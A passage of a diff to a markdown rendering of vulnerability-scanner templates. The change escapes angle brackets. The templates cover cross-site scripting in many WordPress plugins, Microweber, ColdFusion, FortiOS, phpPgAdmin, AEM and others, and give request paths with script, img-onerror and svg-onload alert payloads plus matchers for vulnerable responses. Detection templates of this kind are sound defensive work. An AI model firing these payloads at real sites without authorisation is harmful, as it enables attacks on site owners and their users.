+GET /kfm/index.php/'\<script>alert(document.domain);\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -15032,7 +15032,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain);</script>
+    1. \<script>alert(document.domain);\</script>
     2. x_kfm_changeCaption
     3. kfm_copyFiles
 - condition - and
@@ -15047,7 +15047,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Simple Membership <4.1.1 - Cross-Site Scripting
+# WordPress Simple Membership \<4.1.1 - Cross-Site Scripting
 ## Description
 - WordPress Simple Membership plugin before 4.1.1 contains a reflected cross-site scripting vulnerability. It does not properly sanitize and escape parameters before outputting them back in AJAX actions.
 - severity - medium
@@ -15061,7 +15061,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "<script>alert(document.domain)</script>",
+    1. "\<script>alert(document.domain)\</script>",
 
 **Type - word**
 - part - header
@@ -15090,11 +15090,11 @@ Host: {{Hostname}}
     1. status_code == 200
     2. contains(content_type, "text/html")
     3. contains(body, "wpb_jplayer_setting")
-    4. contains(body, "<script>alert(document.domain)</script>")
+    4. contains(body, "\<script>alert(document.domain)\</script>")
 - condition - and
 
 ---
-# Active Products Tables for WooCommerce < 1.0.5 - Cross Site Scripting
+# Active Products Tables for WooCommerce \< 1.0.5 - Cross Site Scripting
 ## Description
 - The plugin does not sanitise and escape a parameter before outputting it back in the response of an AJAX action (available to both unauthenticated and authenticated users), leading to a Reflected cross-Site Scripting.
 
@@ -15109,7 +15109,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - body
@@ -15129,7 +15129,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Plugin MapPress <2.73.4 - Cross-Site Scripting
+# WordPress Plugin MapPress \<2.73.4 - Cross-Site Scripting
 ## Description
 - WordPress Plugin MapPress before version 2.73.4 does not sanitize and escape the 'mapid' parameter before outputting it back in the "Bad mapid" error message, leading to reflected cross-site scripting.
 
@@ -15153,7 +15153,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <img src onerror=alert(document.domain)>
+    1. \<img src onerror=alert(document.domain)>
     2. Bad mapid
 - condition - and
 
@@ -15177,7 +15177,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <svg/onload=alert(document.domain)>
+    1. \<svg/onload=alert(document.domain)>
     2. Login Failed
 - condition - and
 
@@ -15187,9 +15187,9 @@ Host: {{Hostname}}
     1. text/html
 
 ---
-# WordPress RSS Aggregator < 4.20 - Authenticated Cross-Site Scripting
+# WordPress RSS Aggregator \< 4.20 - Authenticated Cross-Site Scripting
 ## Description
-- WordPress RSS Aggregator < 4.20 is susceptible to cross-site scripting. The plugin does not sanitize and escape the id parameter in the wprss_fetch_items_row_action AJAX action before outputting it back in the response, leading to reflected cross-site scripting.
+- WordPress RSS Aggregator \< 4.20 is susceptible to cross-site scripting. The plugin does not sanitize and escape the id parameter in the wprss_fetch_items_row_action AJAX action before outputting it back in the response, leading to reflected cross-site scripting.
 - severity - medium
 - tags - wpscan,cve,cve2022,wordpress,xss,wp-plugin,authenticated
 ## Requests
@@ -15219,7 +15219,7 @@ id=%3Chtml%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29%3E
 **Type - word**
 - part - body
 - words
-    1. <img src onerror=alert(`document.domain`)>
+    1. \<img src onerror=alert(`document.domain`)>
 
 **Type - word**
 - part - header
@@ -15231,7 +15231,7 @@ id=%3Chtml%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29%3E
     1. 200
 
 ---
-# WordPress Accessibility Helper <0.6.0.7 - Cross-Site Scripting
+# WordPress Accessibility Helper \<0.6.0.7 - Cross-Site Scripting
 ## Description
 - WordPress Accessibility Helper plugin before 0.6.0.7 contains a cross-site scripting vulnerability. It does not sanitize and escape the wahi parameter before outputting back its base64 decode value in the page.
 
@@ -15293,7 +15293,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Visual Form Builder <3.0.8 - Cross-Site Scripting
+# WordPress Visual Form Builder \<3.0.8 - Cross-Site Scripting
 ## Description
 - WordPress Visual Form Builder plugin before 3.0.8 contains a cross-site scripting vulnerability. The plugin does not perform access control on entry form export, allowing an unauthenticated user to export the form entries as CSV files using the vfb-export endpoint.
 
@@ -15324,7 +15324,7 @@ vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_en
     1. 200
 
 ---
-# Packagist <1.2.11 - Cross-Site Scripting
+# Packagist \<1.2.11 - Cross-Site Scripting
 ## Description
 - Packagist prior to 1.2.11 contains a cross-site scripting vulnerability via microweber/microweber. User can escape the meta tag because the user doesn't escape the double-quote in the $redirectUrl parameter when logging out.
 
@@ -15339,7 +15339,7 @@ vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_en
 **Type - word**
 - part - body
 - words
-    1. ><script>alert(document.domain)</script>
+    1. >\<script>alert(document.domain)\</script>
     2. content="Microweber"
 - condition - and
 
@@ -15353,7 +15353,7 @@ vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_en
     1. 404
 
 ---
-# WordPress Gwyn's Imagemap Selector <=0.3.3 - Cross-Site Scripting
+# WordPress Gwyn's Imagemap Selector \<=0.3.3 - Cross-Site Scripting
 ## Description
 - Wordpress Gwyn's Imagemap Selector plugin 0.3.3 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize the id and class parameters before returning them back in attributes.
 
@@ -15369,7 +15369,7 @@ vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_en
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script> popup-
+    1. \</script>\<script>alert(document.domain)\</script> popup-
 
 **Type - word**
 - part - header
@@ -15381,7 +15381,7 @@ vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_en
     1. 200
 
 ---
-# CDI < 5.1.9 - Cross Site Scripting
+# CDI \< 5.1.9 - Cross Site Scripting
 ## Description
 - The plugin does not sanitise and escape a parameter before outputting it back in the response of an AJAX action (available to both unauthenticated and authenticated users), leading to a Reflected Cross-Site Scripting.
 
@@ -15396,7 +15396,7 @@ vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_en
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. Tracking code not correct
 - condition - and
 
@@ -15410,7 +15410,7 @@ vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_en
     1. 200
 
 ---
-# HTML Email Template Designer < 3.1 - Stored Cross-Site Scripting
+# HTML Email Template Designer \< 3.1 - Stored Cross-Site Scripting
 ## Description
 - WordPress Email Template Designer WP HTML Mail allows stored cross-site scripting through an unprotected REST-API endpoint.
 - severity - medium
@@ -15438,7 +15438,7 @@ vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_en
     1. 200
 
 ---
-# WordPress Awin Data Feed <=1.6 - Cross-Site Scripting
+# WordPress Awin Data Feed \<=1.6 - Cross-Site Scripting
 ## Description
 - WordPress Awin Data Feed plugin 1.6 and prior contains a cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back via an AJAX action, available to both unauthenticated and authenticated users.
 
@@ -15466,7 +15466,7 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_2, "text/html")
     2. status_code_2 == 200
-    3. contains(body_2, 'colspan=\"2\"><script>alert(document.domain)</script></th>')
+    3. contains(body_2, 'colspan=\"2\">\<script>alert(document.domain)\</script>\</th>')
 - condition - and
 
 ---
@@ -15493,7 +15493,7 @@ Host: {{Hostname}}
 - condition - and
 
 ---
-# WordPress White Label CMS <2.2.9 - Cross-Site Scripting
+# WordPress White Label CMS \<2.2.9 - Cross-Site Scripting
 ## Description
 - WordPress White Label CMS plugin before 2.2.9 contains a reflected cross-site scripting vulnerability. It does not sanitize and validate the wlcms[_login_custom_js] parameter before outputting it back in the response while previewing.
 
@@ -15549,7 +15549,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script> HTTP/1.1
+GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=\</script>\<script>alert(document.domain)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -15558,7 +15558,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>:0
+    1. \</script>\<script>alert(document.domain)\</script>:0
 
 **Type - word**
 - part - header
@@ -15570,7 +15570,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Microweber <1.2.11 - Stored Cross-Site Scripting
+# Microweber \<1.2.11 - Stored Cross-Site Scripting
 ## Description
 - Microweber before 1.2.1 contains multiple stored cross-site scripting vulnerabilities in Shop's Other Settings, Autorespond E-mail Settings, and Payment Methods.
 
@@ -15611,13 +15611,13 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 **Type - dsl**
 - dsl
     1. contains(body_2,"true")
-    2. contains(body_3,'\"><img src=\"x\" onerror=\"alert(document.domain);\">\" placeholder=\"Use default')
+    2. contains(body_3,'\">\<img src=\"x\" onerror=\"alert(document.domain);\">\" placeholder=\"Use default')
     3. contains(all_headers_3,"text/html")
     4. status_code_3==200
 - condition - and
 
 ---
-# Cofax <=2.0RC3 - Cross-Site Scripting
+# Cofax \<=2.0RC3 - Cross-Site Scripting
 ## Description
 - Cofax 2.0 RC3 and earlier contains a cross-site scripting vulnerability in search.htm which allows remote attackers to inject arbitrary web script or HTML via the searchstring parameter.
 - severity - medium
@@ -15635,10 +15635,10 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 **Type - word**
 - part - body
 - words
-    1. '>"</script><script>alert(document.domain)</script>
+    1. '>"\</script>\<script>alert(document.domain)\</script>
 
 ---
-# Adobe Coldfusion <=8.0.1 - Cross-Site Scripting
+# Adobe Coldfusion \<=8.0.1 - Cross-Site Scripting
 ## Description
 - Adobe ColdFusion Server 8.0.1 and earlier contain multiple cross-site scripting vulnerabilities which allow remote attackers to inject arbitrary web script or HTML via (1) the startRow parameter to administrator/logviewer/searchlog.cfm, or the query string to (2) wizards/common/_logintowizard.cfm, (3) wizards/common/_authenticatewizarduser.cfm, or (4) administrator/enter.cfm.
 - severity - medium
@@ -15651,7 +15651,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -15664,7 +15664,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
     1. 200
 
 ---
-# Cherokee HTTPD <=0.5 - Cross-Site Scripting
+# Cherokee HTTPD \<=0.5 - Cross-Site Scripting
 ## Description
 - Cherokee HTTPD 0.5 and earlier contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via a malformed request that generates an HTTP 400 error, which is not properly handled when the error message is generated.
 - severity - medium
@@ -15681,7 +15681,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -15707,7 +15707,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -15736,10 +15736,10 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert('{{randstr}}')</script>
+    1. \</script>\<script>alert('{{randstr}}')\</script>
 
 ---
-# Navis DocumentCloud <0.1.1 - Cross-Site Scripting
+# Navis DocumentCloud \<0.1.1 - Cross-Site Scripting
 ## Description
 - Navis DocumentCloud plugin before 0.1.1 for WordPress contains a reflected cross-site scripting vulnerability in js/window.php which allows remote attackers to inject arbitrary web script or HTML via the wpbase parameter.
 - severity - medium
@@ -15752,7 +15752,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -15765,7 +15765,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
     1. 200
 
 ---
-# Combodo iTop <2.2.0-2459 - Cross-Site Scripting
+# Combodo iTop \<2.2.0-2459 - Cross-Site Scripting
 ## Description
 - Combodo iTop before 2.2.0-2459 contains a cross-site scripting vulnerability in application/dashboard.class.inc.php which allows remote attackers to inject arbitrary web script or HTML via a dashboard title.
 
@@ -15779,7 +15779,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -15792,7 +15792,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
     1. text/html
 
 ---
-# WordPress Pie-Register <2.0.19 - Cross-Site Scripting
+# WordPress Pie-Register \<2.0.19 - Cross-Site Scripting
 ## Description
 - WordPress Pie Register before 2.0.19 contains a reflected cross-site scripting vulnerability in pie-register/pie-register.php which allows remote attackers to inject arbitrary web script or HTML via the invitaion_code parameter in a pie-register page to the default URL.
 - severity - medium
@@ -15805,7 +15805,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -15818,7 +15818,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
     1. 200
 
 ---
-# WordPress Symposium <=15.8.1 - Cross-Site Scripting
+# WordPress Symposium \<=15.8.1 - Cross-Site Scripting
 ## Description
 - WordPress Symposium through 15.8.1 contains a reflected cross-site scripting vulnerability via the wp-content/plugins/wp-symposium/get_album_item.php?size parameter which allows an attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -15831,7 +15831,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -15844,7 +15844,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
     1. 200
 
 ---
-# Fortinet FortiOS <=5.2.3 - Cross-Site Scripting
+# Fortinet FortiOS \<=5.2.3 - Cross-Site Scripting
 ## Description
 - Fortinet FortiOS 5.2.x before 5.2.3 contains a cross-site scripting vulnerability in the SSL VPN login page which allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.
 - severity - medium
@@ -15857,7 +15857,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. <script>alert('{{randstr}}')</script>
+    1. \<script>alert('{{randstr}}')\</script>
 - part - body
 
 **Type - status**
@@ -15870,7 +15870,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 - part - header
 
 ---
-# WordPress sourceAFRICA <=0.1.3 - Cross-Site Scripting
+# WordPress sourceAFRICA \<=0.1.3 - Cross-Site Scripting
 ## Description
 - WordPress sourceAFRICA plugin version 0.1.3 contains a cross-site scripting vulnerability.
 - severity - medium
@@ -15883,7 +15883,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. "></script><script>alert(document.domain)</script>
+    1. ">\</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -15896,7 +15896,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
     1. 200
 
 ---
-# WordPress Church Admin <0.810 - Cross-Site Scripting
+# WordPress Church Admin \<0.810 - Cross-Site Scripting
 ## Description
 - WordPress Church Admin plugin before 0.810 allows remote attackers to inject arbitrary web script or HTML via the address parameter via index.php/2015/05/21/church_admin-registration-form/.
 
@@ -15911,7 +15911,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -15923,7 +15923,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
     1. 200
 
 ---
-# SourceBans <2.0 - Cross-Site Scripting
+# SourceBans \<2.0 - Cross-Site Scripting
 ## Description
 - SourceBans before 2.0 contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via the advSearch parameter to index.php.
 - severity - medium
@@ -15936,7 +15936,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -15963,7 +15963,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -15997,7 +15997,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -16018,7 +16018,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
 
 **Type - status**
 - status
@@ -16030,7 +16030,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
     1. text/html
 
 ---
-# phpPgAdmin <=4.1.1 - Cross-Site Scripting
+# phpPgAdmin \<=4.1.1 - Cross-Site Scripting
 ## Description
 - phpPgAdmin 3.5 to 4.1.1, and possibly 4.1.2, is vulnerable to cross-site scripting and allows remote attackers to inject arbitrary web script or HTML via certain input available in PHP_SELF in (1) redirect.php, possibly related to (2) login.php, which are different vectors than CVE-2007-2865.
 - severity - medium
@@ -16043,7 +16043,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 
 **Type - word**
 - words
-    1. <script>alert("document.domain")</script>
+    1. \<script>alert("document.domain")\</script>
 
 **Type - status**
 - status
@@ -16086,7 +16086,7 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 **Type - word**
 - condition - and
 - words
-    1. "><svg onload=confirm(document.domain)>
+    1. ">\<svg onload=confirm(document.domain)>
     2. Suggestions for improving the results
 
 **Type - word**
@@ -16148,13 +16148,13 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
-- {{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
+- {{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=\<svg/onload=confirm(document.domain);>//a
+- {{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=\<svg/onload=confirm(document.domain);>//a
 ### Matchers
 
 **Type - word**
 - words
-    1. <svg/onload=confirm(document.domain);>
+    1. \<svg/onload=confirm(document.domain);>
     2. A JSONObject text must begin with
 - condition - and
 
@@ -16172,12 +16172,12 @@ module=settings%2Fsystem_settings&id=settings_admin_mw-main-module-backend-setti
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
+- {{BaseURL}}/etc/designs/xh1x.childrenlist.json//\<svg onload=alert(document.domain)>.html
 ### Matchers
 
 **Type - word**
 - words
-    1. <svg onload=alert(document.domain)>
+    1. \<svg onload=alert(document.domain)>
     2. {"path":"/etc/designs/xh1x.childrenlist.json
 - condition - and
 
